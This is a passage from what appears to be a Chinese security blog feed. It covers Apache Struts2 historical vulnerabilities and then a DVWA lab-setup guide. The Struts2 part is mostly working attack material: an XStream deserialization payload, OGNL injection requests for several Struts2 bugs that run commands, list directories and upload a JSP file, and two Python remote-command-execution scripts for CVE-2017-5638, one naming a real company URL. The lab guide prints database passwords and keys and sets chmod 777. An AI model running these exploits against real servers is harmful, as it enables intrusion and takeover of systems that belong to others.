class="line">&lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">&lt;name&gt;start&lt;/name&gt;</span><br><span class="line">&lt;parameter-types/&gt;</span><br><span class="line">&lt;/method&gt;</span><br><span class="line">&lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">&lt;/serviceIterator&gt;</span><br><span class="line">&lt;lock/&gt;</span><br><span class="line">&lt;/cipher&gt;</span><br><span class="line">&lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">&lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">&lt;done&gt;false&lt;/done&gt;</span><br><span class="line">&lt;ostart&gt;0&lt;/ostart&gt;</span><br><span class="line">&lt;ofinish&gt;0&lt;/ofinish&gt;</span><br><span class="line">&lt;closed&gt;false&lt;/closed&gt;</span><br><span class="line">&lt;/is&gt;</span><br><span class="line">&lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">&lt;/dataSource&gt;</span><br><span class="line">&lt;transferFlavors/&gt;</span><br><span class="line">&lt;/dataHandler&gt;</span><br><span class="line">&lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">&lt;/value&gt;</span><br><span class="line">&lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">&lt;/entry&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure><p>Windows下关键字为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;command&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/command&gt;</span><br></pre></td></tr></table></figure><p>Mac下关键字为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;command&gt;&lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;&lt;/command&gt;</span><br></pre></td></tr></table></figure><h3 id="struts2-046"><a href="#struts2-046" class="headerlink" title="struts2-046"></a>struts2-046</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Length: 10000000</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,&#x27;Kaboom&#x27;)&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Kaboom </span><br><span class="line"> </span><br><span class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z--</span><br></pre></td></tr></table></figure><h3 id="struts2-045（2017-3）"><a href="#struts2-045（2017-3）" class="headerlink" title="struts2-045（2017.3）"></a>struts2-045（2017.3）</h3><blockquote><p>(Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">import sys</span><br><span class="line">from poster.encode import multipart_encode</span><br><span class="line">from poster.streaminghttp import register_openers</span><br><span class="line">def poc(url):</span><br><span class="line">    register_openers()</span><br><span class="line">    datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;)</span><br><span class="line">    header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</span><br><span class="line">    header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;echo nMask&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br><span class="line">    request = urllib2.Request(url,datagen,headers=header)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    body=response.read()</span><br><span class="line">    return body</span><br><span class="line">url=&quot;http://job.10086.cn/company/anouncement/showAnouncement.action&quot;</span><br><span class="line">url=sys.argv[1]</span><br><span class="line">body=poc(url)</span><br><span class="line">if &quot;nMask&quot; in body:</span><br><span class="line">    print &quot;[Loopholes exist]&quot;,url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import urllib2</span><br><span class="line">import httplib</span><br><span class="line">def exploit(url, cmd):</span><br><span class="line">    payload = &quot;%&#123;(#_=&#x27;multipart/form-data&#x27;).&quot;</span><br><span class="line">    payload += &quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;</span><br><span class="line">    payload += &quot;(#_memberAccess?&quot;</span><br><span class="line">    payload += &quot;(#_memberAccess=#dm):&quot;</span><br><span class="line">    payload += &quot;((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).&quot;</span><br><span class="line">    payload += &quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;</span><br><span class="line">    payload += &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot;</span><br><span class="line">    payload += &quot;(#ognlUtil.getExcludedClasses().clear()).&quot;</span><br><span class="line">    payload += &quot;(#context.setMemberAccess(#dm)))).&quot;</span><br><span class="line">    payload += &quot;(#cmd=&#x27;%s&#x27;).&quot; % cmd</span><br><span class="line">    payload += &quot;(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).&quot;</span><br><span class="line">    payload += &quot;(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).&quot;</span><br><span class="line">    payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot;</span><br><span class="line">    payload += &quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot;</span><br><span class="line">    payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;</span><br><span class="line">    payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;</span><br><span class="line">    payload += &quot;(#ros.flush())&#125;&quot;</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0&#x27;, &#x27;Content-Type&#x27;: payload&#125;</span><br><span class="line">        request = urllib2.Request(url, headers=headers)</span><br><span class="line">        page = urllib2.urlopen(request).read()</span><br><span class="line">    except httplib.IncompleteRead, e:</span><br><span class="line">        page = e.partial</span><br><span class="line">    print(page)</span><br><span class="line">    return page</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    import sys</span><br><span class="line">    if len(sys.argv) != 3:</span><br><span class="line">        print(&quot;[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;[*] CVE: 2017-5638 - Apache Struts2 S2-045&#x27;)</span><br><span class="line">        url = sys.argv[1]</span><br><span class="line">        cmd = sys.argv[2]</span><br><span class="line">        print(&quot;[*] cmd: %s\n&quot; % cmd)</span><br><span class="line">        exploit(url, cmd)</span><br></pre></td></tr></table></figure><h3 id="struts2-037"><a href="#struts2-037" class="headerlink" title="struts2_037"></a>struts2_037</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/struts2-rest-showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=calc</span><br><span class="line">http://127.0.0.1:8080/struts2-rest- showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse</span><br></pre></td></tr></table></figure><h3 id="struts2-032"><a href="#struts2-032" class="headerlink" title="struts2_032"></a>struts2_032</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&amp;command=whoami</span><br></pre></td></tr></table></figure><h4 id="获取磁盘目录："><a href="#获取磁盘目录：" class="headerlink" title="获取磁盘目录："></a>获取磁盘目录：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8</span><br></pre></td></tr></table></figure><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令:"></a>执行命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8</span><br><span class="line"></span><br><span class="line">method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d&#123;&#125;,%23_memberAccess[%23parameters.name3[0]]%3d&#123;&#125;,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;name=allowStaticMethodAccess&amp;name1=allowPrivateAccess&amp;name2=excludedPackageNamePatterns&amp;name3=excludedClasses&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8</span><br></pre></td></tr></table></figure><h4 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&amp;shellname=stest.jsp&amp;shellContent=tttt&amp;encoding=UTF-8&amp;pp=%2f</span><br></pre></td></tr></table></figure><h3 id="struts2-016"><a href="#struts2-016" class="headerlink" title="struts2_016"></a>struts2_016</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redirect:$&#123;%23res%3d%23context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;%22whoami%22&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h3 id="struts2-019"><a href="#struts2-019" class="headerlink" title="struts2_019"></a>struts2_019</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">debug=command&amp;expression=%23res%3d%23context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;%22whoami%22&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()</span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> Struts2 </tag>
            
            <tag> 框架漏洞 </tag>
            
            <tag> Poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x06 - Web安全基础-环境搭建</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/0x06-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/0x06-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>友情提示：靶场别搭载主机或者是服务器上，漏洞这么多很容易被搞的。建议在虚拟机搞或者docker里面折腾</p><h2 id="WAMP集成环境搭建"><a href="#WAMP集成环境搭建" class="headerlink" title="WAMP集成环境搭建"></a>WAMP集成环境搭建</h2><h3 id="WAMP简介"><a href="#WAMP简介" class="headerlink" title="WAMP简介"></a>WAMP简介</h3><blockquote><p>W：windows</p><p>A：apache</p><p>M：mysql，mariadb</p><p>P：php</p></blockquote><h3 id="下载phpstudy"><a href="#下载phpstudy" class="headerlink" title="下载phpstudy"></a>下载phpstudy</h3><blockquote><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><p>选择 v8.1</p></blockquote><p>PHPStudy 简介：该程序包集成最新的 Apache+PHP+MySQL,一次性安装，无须配置即可使用，是非常方便、好用的 PHP 调试环境，该程序不仅包括 PHP 调试环境，还包括了开发工具、开发手册等·总之学习 PHP 只需一个包。对学习 PHP 的新手来说，WINDOWS 下环境配置是一件很困难的事；对老手 来说也是一件烦琐的事。因此无论你是新手还是老手，该程序包都是一个不错的选择。</p><blockquote><p>默认安装即可</p></blockquote><h2 id="LAMP集成环境搭建"><a href="#LAMP集成环境搭建" class="headerlink" title="LAMP集成环境搭建"></a>LAMP集成环境搭建</h2><h3 id="LAMP"><a href="#LAMP" class="headerlink" title="LAMP"></a>LAMP</h3><blockquote><p>L: LINUX</p><p>A：apache</p><p>M：mysql，mariadb</p><p>P：php</p></blockquote><h3 id="Docker-搭建-LAMP"><a href="#Docker-搭建-LAMP" class="headerlink" title="Docker 搭建 LAMP"></a>Docker 搭建 LAMP</h3><blockquote><p><a href="https://hub.docker.com/r/mattrayner/lamp">https://hub.docker.com/r/mattrayner/lamp</a> </p><p><a href="https://hub.docker.com/r/mattrayner/lamp/tags">https://hub.docker.com/r/mattrayner/lamp/tags</a></p><p>mattrayner&#x2F;lamp Tags | Docker Hub</p></blockquote><h3 id="Docker下载LAMP镜像"><a href="#Docker下载LAMP镜像" class="headerlink" title="Docker下载LAMP镜像"></a>Docker下载LAMP镜像</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull mattrayner/lamp:1604-php5-base</span><br><span class="line"><span class="comment">#之前的lamp好像有点问题</span></span><br><span class="line">docker pull mattrayner/lamp:latest-1604-php5</span><br></pre></td></tr></table></figure><h3 id="Docker启动LAMP容器"><a href="#Docker启动LAMP容器" class="headerlink" title="Docker启动LAMP容器"></a>Docker启动LAMP容器</h3><blockquote><p>使用之前建议先看<a href="https://hub.docker.com/r/mattrayner/lamp">https://hub.docker.com/r/mattrayner/lamp</a> 的介绍怎么用~~</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -dit -p <span class="string">&quot;8088:80&quot;</span> -v <span class="variable">$&#123;PWD&#125;</span>/share:/share mattrayner/lamp:1604-php5-base</span><br><span class="line"><span class="comment"># Launch a 16.04 based image</span></span><br><span class="line">docker run -dit -p <span class="string">&quot;8088:80&quot;</span> -v <span class="variable">$&#123;PWD&#125;</span>/share:/app mattrayner/lamp:latest-1604-php5</span><br><span class="line"></span><br><span class="line">//注释</span><br><span class="line">//-p表示端口映射，前面主机后面容器</span><br><span class="line">//-v表示目录映射，前面主机后面容器</span><br><span class="line">我dvwa目录下载在容器里面 防止vps被入侵，但是依旧开通了共享文件夹，共享文件夹不是app，而是改的share</span><br><span class="line">//<span class="variable">$&#123;pwd&#125;</span>表示获取终端中执行<span class="built_in">pwd</span>命令的结果，类似一个变量，<span class="built_in">pwd</span>表示获取当前目录</span><br><span class="line">netstat -anlp|grep 8088    查看当前</span><br></pre></td></tr></table></figure><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>默认情况下，映像附带一个没有密码的MySQL帐户。此帐户仅在本地可用，即在您的应用程序中可用。它不能从您的docker程序映像外部或通过 phpMyAdmin 获得<code>root</code></p><p>首次运行image时，你将看到一条消息，显示用户的密码。此用户可以在本地和外部使用，也可以通过连接到MySQL端口（默认为3306）并使用MySQL工作台或续集专业版等工具，或通过phpMyAdmin。<code>admin</code></p><p>如果您以后需要此登录名，则可以运行，并且应该在日志顶部看到它。<code>docker logs CONTAINER_ID</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#注 lamp:1604-php5-base镜像生成的容器密码是这么多：</span></span><br><span class="line">mysql -uadmin -pONS8OvevwcVo -h&lt;host&gt; -P&lt;port&gt;</span><br><span class="line"><span class="comment">#后来的mattrayner/lamp:latest-1604-php5</span></span><br><span class="line"><span class="comment">#查看到密码如下</span></span><br><span class="line">You can now connect to this MySQL Server with U2EKSVPn7VRJ</span><br><span class="line">    mysql -uadmin -peJ1dB2FcCZPh -h&lt;host&gt; -P&lt;port&gt;</span><br></pre></td></tr></table></figure><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><blockquote><p>因此，您的应用程序需要一个数据库 - 您有两个选择…</p><ol><li>PHPMyAdmin</li><li>Command line</li></ol><p>首先，使用 获取正在运行的容器的 ID，然后运行以下命令，将 和 替换为所需的值：<code>docker ps``CONTAINER_ID``DATABASE_NAME</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> CONTAINER_ID  mysql -uroot -e <span class="string">&quot;create database DATABASE_NAME&quot;</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="进入容器："><a href="#进入容器：" class="headerlink" title="进入容器："></a>进入容器：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 78 bash</span><br></pre></td></tr></table></figure><h2 id="搭建DVWA靶场"><a href="#搭建DVWA靶场" class="headerlink" title="搭建DVWA靶场"></a>搭建DVWA靶场</h2><p>不管是LAMP还是WAMP只要将源码网站根目录就可以开始搭建了，主要需要注意的是配置文件的修改</p><h3 id="下载DVWA靶场"><a href="#下载DVWA靶场" class="headerlink" title="下载DVWA靶场"></a>下载DVWA靶场</h3><blockquote><p><a href="https://github.com/digininja/DVWA/archive/master.zip">https://github.com/digininja/DVWA/archive/master.zip</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> app/</span><br><span class="line">wget https://github.com/digininja/DVWA/archive/master.zip</span><br><span class="line">unzip master.zip</span><br><span class="line"><span class="built_in">mv</span> DVWA-master/ dvwa <span class="comment">#修改名字</span></span><br><span class="line">admin/password <span class="comment">#登录密码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#或者直接git</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/digininja/DVWA.git</span><br></pre></td></tr></table></figure><h3 id="普通搭建"><a href="#普通搭建" class="headerlink" title="普通搭建"></a>普通搭建</h3><h4 id="修改dist文件为php，使配置文件生效："><a href="#修改dist文件为php，使配置文件生效：" class="headerlink" title="修改dist文件为php，使配置文件生效："></a>修改dist文件为php，使配置文件生效：</h4><blockquote><p>进入 DVWA 的配置目录config下，把 config.inc.php.dist 模板配置文件复制一份，并命名为config.inc.php</p><p><code>D:\MyServer\Server\WWW\dvwa\config\config.inc.php</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /app/dvwa/config</span><br><span class="line"><span class="built_in">cp</span> config.inc.php.dist config.inc.php</span><br><span class="line"><span class="comment">#如果出了问题去备份文件查看密码</span></span><br><span class="line">vim config.inc.php</span><br></pre></td></tr></table></figure></blockquote><h4 id="修改数据库连接配置文件"><a href="#修改数据库连接配置文件" class="headerlink" title="修改数据库连接配置文件"></a>修改数据库连接配置文件</h4><p>打开<code>config.inc.php</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span> = array();</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_server&#x27;</span> ]   = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_database&#x27;</span> ] = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;eJ1dB2FcCZPh&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_port&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="修改登录账户和密码"><a href="#修改登录账户和密码" class="headerlink" title="修改登录账户和密码"></a>修改登录账户和密码</h4><p>同样是在<code>config.inc.php</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ReCAPTCHA settings</span></span><br><span class="line"><span class="comment">#   Used for the &#x27;Insecure CAPTCHA&#x27; module</span></span><br><span class="line"><span class="comment">#   You&#x27;ll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ]  = <span class="string">&#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>添加上谷歌开源免费验证码 reCAPTCHA 的公钥和私钥</p><p>扩展：可以自己去 google 注册验证码，<a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a></p></blockquote><h4 id="创建数据库-初始化"><a href="#创建数据库-初始化" class="headerlink" title="创建数据库 初始化"></a>创建数据库 初始化</h4><blockquote><p>刷新进入<a href="http://127.0.0.1/dvwa/setup.php%E7%95%8C%E9%9D%A2%E4%B8%8B%EF%BC%8C%E7%82%B9%E5%87%BBcreat/reset">http://127.0.0.1/dvwa/setup.php界面下，点击creat/reset</a> dabase</p></blockquote><h3 id="完善配置-可能出现的问题"><a href="#完善配置-可能出现的问题" class="headerlink" title="完善配置(可能出现的问题)"></a>完善配置(可能出现的问题)</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210052131828.png" alt="image-20221005213111641" style="zoom:50%;" /><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/php/</span><br><span class="line"><span class="comment">#注意到我们使用5.6版本php</span></span><br><span class="line"><span class="built_in">cd</span> 5.6</span><br><span class="line"><span class="built_in">cd</span> apache2/</span><br><span class="line">vim php.ini<span class="comment">#编辑配置文件</span></span><br><span class="line">底线命令下检索：</span><br><span class="line">/allow_url_include</span><br><span class="line">将其值改为on</span><br><span class="line">重启apache，</span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure><p> 配置文件夹权限</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> app/DVWA/</span><br><span class="line"><span class="built_in">chmod</span> -R 777 hackable/uploads/</span><br><span class="line"><span class="built_in">chmod</span> -R 777 external/phpids/0.6/lib/IDS/tmp/</span><br><span class="line"><span class="built_in">chmod</span> -R 777 config</span><br></pre></td></tr></table></figure><h4 id="进入登录界面"><a href="#进入登录界面" class="headerlink" title="进入登录界面"></a>进入登录界面</h4><blockquote><p>dvwa 的登录界面的默认用户名：admin ，密码: password；</p></blockquote><h3 id="Docker快速搭建DVWA"><a href="#Docker快速搭建DVWA" class="headerlink" title="Docker快速搭建DVWA"></a>Docker快速搭建DVWA</h3><p>DVWA 简介：DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的 PHP&#x2F;MySQL Web 应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web 开发者更好的理解 web 应用安全防范的过程。</p><p>DVWA 是 randomstorm 的一个开源项目，需要注意的是，代码分为四种安全级别：Low，Medium， High，Impossible。也有一些 PHP 代码审计的内容。</p><blockquote><p><code>Damn Vulnerable Web Application</code>#特别容易受攻击的 web 应用程序</p></blockquote><blockquote><p><a href="https://registry.hub.docker.com/r/citizenstig/dvwa">https://registry.hub.docker.com/r/citizenstig/dvwa</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull citizenstig/dvwa</span><br><span class="line">docker run -d -p 8088:80 -p 33066:3306 -e MYSQL_PASS=&quot;lmb123&quot; citizenstig/dvwa</span><br></pre></td></tr></table></figure><blockquote><p>出现了同样的问题：<code>CSRF token is 